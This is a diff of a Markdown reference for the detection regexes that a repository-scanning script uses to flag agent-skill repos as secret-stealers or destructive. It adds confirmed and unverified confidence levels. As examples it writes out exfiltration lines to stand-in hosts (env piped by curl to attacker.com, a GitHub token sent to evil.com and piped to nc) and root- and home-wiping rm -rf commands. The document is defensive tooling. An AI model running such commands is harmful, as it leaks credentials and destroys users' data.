@@ -1,12 +1,23 @@
 # Security Label Detection Reference
 
 Detection patterns used by `analyze-repos.py` to assign security signal labels.
-These are heuristics — false positives are possible. Open an issue to contest.
 
-## `env-stealer` 🚨
+## Two confidence levels
 
-Applied when scripts or workflows appear to exfiltrate environment variables
-or secrets to external destinations.
+Security signals use two levels to avoid false accusations:
+
+| Level | Label suffix | Icon | Meaning |
+|-------|-------------|------|---------|
+| **Confirmed** | `env-stealer`, `rm-rf` | 🚨 💥 | Pattern is unambiguously dangerous. No legitimate use case matches it. |
+| **Unverified** | `env-stealer?`, `rm-rf?` | ⚠️ | Pattern is suspicious but also appears in legitimate scripts. Needs human review before drawing conclusions. |
+
+A confirmed signal always supersedes the unverified signal for the same type.
+
+---
+
+## `env-stealer` 🚨 — Confirmed
+
+Applied when scripts **clearly pipe environment variables to a remote destination**.
 
 **Detection patterns (regex):**
 
@@ -16,48 +27,91 @@ or secrets to external destinations.
 Example: `env | curl -X POST https://attacker.com`
 
 ```
-curl.*\$\{?GITHUB_TOKEN
+curl[^|]*\$\{?GITHUB_TOKEN[^|]*\|\s*nc\b
 ```
-Example: `curl -H "Auth: $GITHUB_TOKEN" https://external.com`
+Example: `curl -H "Auth: $GITHUB_TOKEN" https://evil.com | nc attacker.com 4444`
 
-```
-curl.*\$\{?secrets\.
-```
-Example (GitHub Actions): `curl ... "${{ secrets.MY_SECRET }}" https://external.com`
-
-```
-wget.*\$(env|HOME|USER|PATH)
-```
-Example: `wget https://attacker.com?data=$(env)`
-
-**Severity:** Critical. Do not install or run skills from repos with this label
-without fully auditing the scripts.
+**What is NOT flagged as confirmed:**
+- `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com` — legitimate GitHub API call
 
 ---
 
-## `rm-rf` 💥
+## `env-stealer?` ⚠️ — Unverified
 
-Applied when scripts contain destructive `rm -rf` targeting broad or variable
-paths without explicit safeguards.
+Applied when scripts use a secret in a curl/wget call — suspicious but very
+common in legitimate CI scripts.
 
 **Detection patterns (regex):**
 
 ```
-rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+(\/\*?|~\/?\*?|"\$)
+curl.*\$\{?GITHUB_TOKEN
 ```
-Matches: `rm -rf /`, `rm -rf /*`, `rm -rf ~/`, `rm -rf "$VAR"`
+Example: `curl -H "Authorization: $GITHUB_TOKEN" https://api.github.com` ← legitimate
 
 ```
-rm\s+-rf\s+\$\{?\w+\}?  (not followed by # ...dry)
+curl.*\$\{?secrets\.
 ```
-Matches: `rm -rf $TMPDIR` (without a dry-run comment)
+Example: `curl ... "${{ secrets.MY_SECRET }}"` ← common in GitHub Actions
 
-**Not flagged:**
-- `rm -rf /tmp/my-specific-dir` — specific known path
-- `rm -rf "$BUILD_DIR" # dry-run: no-op` — commented safeguard
+```
+wget.*\$(HOME|USER|PATH)\b
+```
+Example: `wget https://attacker.com?u=$USER` ← suspicious
 
-**Severity:** High. Review the full script context before deciding if this is
-a false positive.
+**Human review guidance:** Check if the curl target is a well-known API
+(GitHub, npm, PyPI) — if so, almost certainly a false positive. If the
+target is an unknown or unusual URL, treat as a real finding.
+
+---
+
+## `rm-rf` 💥 — Confirmed
+
+Applied only when `rm -rf` targets a **clearly destructive path** with no
+legitimate use case.
+
+**Detection patterns (regex):**
+
+```
+rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+/\*?(?:\s|$)
+```
+Matches: `rm -rf /` or `rm -rf /*` — deletes root filesystem
+
+```
+rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+~/?(?:\s|$)
+```
+Matches: `rm -rf ~` or `rm -rf ~/` — deletes home directory
+
+```
+rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+\*(?:\s|$)
+```
+Matches: `rm -rf *` — bare wildcard, deletes everything in current directory
+
+**What is NOT flagged as confirmed:**
+- `rm -rf ./dist` — explicit relative path, safe
+- `rm -rf ./tmp` — safe cleanup
+- `rm -rf node_modules` — safe cleanup
+- `rm -rf $BUILD_DIR/output` — variable with explicit subpath
+
+---
+
+## `rm-rf?` ⚠️ — Unverified
+
+Applied when `rm -rf` uses a bare variable — could be safe or dangerous
+depending on what the variable contains at runtime.
+
+**Detection patterns (regex):**
+
+```
+rm\s+-[a-zA-Z]*rf[a-zA-Z]*\s+\$\{?\w+\}?\s*(?:#.*)?$
+```
+Matches: `rm -rf $TMPDIR` or `rm -rf ${BUILD_DIR}` at end of line
+
+**Human review guidance:** Find where the variable is set. If it is always
+a specific subdirectory (e.g. `BUILD_DIR=./dist`), it is a false positive.
+If the variable could ever be empty or set to `/`, it is a real finding.
+
+**What is NOT flagged as unverified:**
+- `rm -rf $TMPDIR/my-specific-subpath` — explicit subpath after the variable
 
 ---
 
@@ -68,12 +122,12 @@ connection to the Agent Skills specification.
 
 **Heuristic (all conditions must be true):**
 1. No `SKILL.md` file found anywhere in the repository tree
-2. Repository description contains none of: `skill`, `agent`, `claude`, `llm`, `ai agent`, `SKILL.md`, `agentskills`, `assistant`, `copilot`
-3. Topics do not contain: `skill`, `agent`, `claude`, `llm`
+2. Description contains none of: `skill`, `agent`, `claude`, `llm`, `ai agent`, `SKILL.md`, `agentskills`, `assistant`, `copilot`
+3. Topics do not include: `skill`, `agent`, `claude`, `llm`
 4. Primary language is not Python, Shell, TypeScript, or JavaScript
 
-**Severity:** Low. The repository is likely using the topic for SEO or made a
-mistake. It is not dangerous, just off-topic.
+**Severity:** Low. The repository is likely using the topic for SEO.
+Not dangerous, just off-topic.
 
 ---
 
@@ -84,25 +138,24 @@ against the agentskills.io specification.
 
 **Common causes:**
 - `name` contains uppercase letters or underscores
-- `name` starts or ends with a hyphen, or contains consecutive hyphens
+- `name` starts or ends with a hyphen, or contains consecutive hyphens (`--`)
+- `name` exceeds 64 characters
 - `description` exceeds 1024 characters
 - `description` is empty
-- `name` does not match the directory name
 
-**Severity:** Informational. The skill may still work in some agents, but it
-is not guaranteed to be compatible with all spec-compliant implementations.
+**Severity:** Informational. The skill may still work in some agents but is
+not guaranteed to be compatible with all spec-compliant implementations.
 
 ---
 
-## False positives
+## Reporting false positives
 
-The detection patterns are intentionally conservative to avoid false positives,
-but they are not perfect. Common false positives:
+If you believe a label is incorrect:
 
-- `rm-rf`: cleanup scripts that `rm -rf` a known build directory
-- `env-stealer`: scripts that pipe `env` to a local process (not a URL)
-- `misleading`: repos in early development with no description yet
-
-If you believe a label is incorrect, open an issue in
-`roebi/awesome-agent-skills` with a link to the specific file and an
-explanation.
+- For `rm-rf?` or `env-stealer?` — open an issue in `roebi/awesome-agent-skills`
+  with a link to the specific file and an explanation of why it is safe.
+- For confirmed `rm-rf` or `env-stealer` — if you are the maintainer of the
+  flagged repo and believe it is wrong, open an issue with the exact line and context.
+- **Never** report a confirmed security finding as a public GitHub Issue on the
+  target repo. Use GitHub's private security advisory system instead:
+  `https://github.com/OWNER/REPO/security/advisories/new`
